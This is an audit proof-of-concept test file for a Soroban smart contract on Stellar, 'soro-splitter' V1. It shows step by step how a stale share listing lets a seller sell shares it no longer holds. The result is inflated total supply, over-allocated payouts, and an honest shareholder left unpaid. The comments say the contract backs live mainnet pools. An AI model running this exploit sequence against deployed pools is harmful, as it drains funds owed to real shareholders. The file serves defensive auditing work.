//! AUDIT 2026-08 — proof-of-concept tests for splitter V1 (`soro-splitter`).
//!
//! V1 is the contract behind the ~30 pools already live on Stellar mainnet.
//! Each test asserts the CURRENT (buggy) behaviour so it passes today; when a
//! finding is fixed the test must be inverted.
//!
//! Findings:
//!   D-1  `buy_shares` never checks that the SELLER still holds the shares the
//!        listing advertises. `list_shares_for_sale` does not escrow anything
//!        and `transfer_shares` does not touch the listing, so a seller can
//!        list N, move the shares away, and still sell N. The seller's share
//!        goes NEGATIVE (silently removing them), the buyer is credited N, and
//!        the pool's total share supply is inflated above 10 000 — which is the
//!        fixed denominator every distribution divides by.
//!   D-2  Once inflated, `distribute_tokens` allocates more than it holds, so
//!        `withdraw_allocation` becomes first-come-first-served and honest
//!        shareholders are left unpaid.

extern crate std;
use soroban_sdk::{testutils::Address as _, vec, Address, Env};

use crate::{
    storage::ShareDataKey,
    tests::helpers::{create_splitter, create_token, setup_test_commission_recipient},
};

/// D-1 / D-2 — share-supply inflation through a stale marketplace listing.
///
/// AFTER THE FIX: `buy_shares` must re-read the seller's live share balance and
/// reject (or clamp) when it is below `shares_amount`; `transfer_shares` should
/// additionally cancel/shrink an outstanding listing.
#[test]
fn poc_d1_stale_listing_lets_a_seller_sell_shares_it_no_longer_owns() {
    let env = Env::default();
    env.mock_all_auths();

    let admin = Address::generate(&env);
    let (splitter, splitter_address) = create_splitter(&env);

    let seller = Address::generate(&env);
    let honest = Address::generate(&env);
    let shares = vec![
        &env,
        ShareDataKey { shareholder: seller.clone(), share: 5000 },
        ShareDataKey { shareholder: honest.clone(), share: 5000 },
    ];
    splitter.init(&admin, &shares, &true);

    let token_admin_addr = Address::generate(&env);
    let (token_client, token_admin, token_address) = create_token(&env, &token_admin_addr);
    setup_test_commission_recipient(&env, &splitter, &[&token_admin]);

    // The seller lists its whole 5000. Nothing is escrowed.
    splitter.list_shares_for_sale(&seller, &5000, &1, &token_address);

    // …then moves 4999 of those very shares to an address it also controls.
    let sock_puppet = Address::generate(&env);
    splitter.transfer_shares(&seller, &sock_puppet, &4999);
    assert_eq!(splitter.get_share(&seller).unwrap(), 1);
    assert_eq!(splitter.get_share(&sock_puppet).unwrap(), 4999);

    // The listing is untouched and still advertises 5000.
    assert_eq!(splitter.get_listing(&seller).unwrap().shares_for_sale, 5000);

    // A second address it controls "buys" the whole listing for 5000 × 1 unit.
    let buyer = Address::generate(&env);
    token_admin.mint(&buyer, &1_000_000);
    token_admin.mint(&seller, &0);
    splitter.buy_shares(&buyer, &seller, &5000);

    // The seller only had 1 share: 1 - 5000 = -4999 → treated as "no shares
    // left" and silently removed, while the buyer is credited the full 5000.
    assert!(splitter.get_share(&seller).is_none());
    assert_eq!(splitter.get_share(&buyer).unwrap(), 5000);

    // Live supply is now 14 999 against a hardcoded denominator of 10 000.
    let live_supply = splitter.get_share(&sock_puppet).unwrap()
        + splitter.get_share(&buyer).unwrap()
        + splitter.get_share(&honest).unwrap();
    assert_eq!(live_supply, 14_999);

    // D-2: a distribution of 10 000 now allocates ~150% of what it holds.
    token_admin.mint(&splitter_address, &10_000);
    splitter.distribute_tokens(&token_address);

    let a_puppet = splitter.get_allocation(&sock_puppet, &token_address);
    let a_buyer = splitter.get_allocation(&buyer, &token_address);
    let a_honest = splitter.get_allocation(&honest, &token_address);
    let distributable = 10_000 - (10_000 * 50 / 10_000); // 0.5% commission
    assert!(
        a_puppet + a_buyer + a_honest > distributable,
        "allocated {} against a distributable {}",
        a_puppet + a_buyer + a_honest,
        distributable
    );

    // First come, first served: the attacker's two addresses withdraw first…
    splitter.withdraw_allocation(&token_address, &sock_puppet, &a_puppet);
    splitter.withdraw_allocation(&token_address, &buyer, &a_buyer);

    // …and the honest 50% holder cannot withdraw the allocation it was promised.
    assert!(token_client.balance(&splitter_address) < a_honest);
    assert!(
        splitter
            .try_withdraw_allocation(&token_address, &honest, &a_honest)
            .is_err(),
        "the honest shareholder is left unpaid"
    );
}
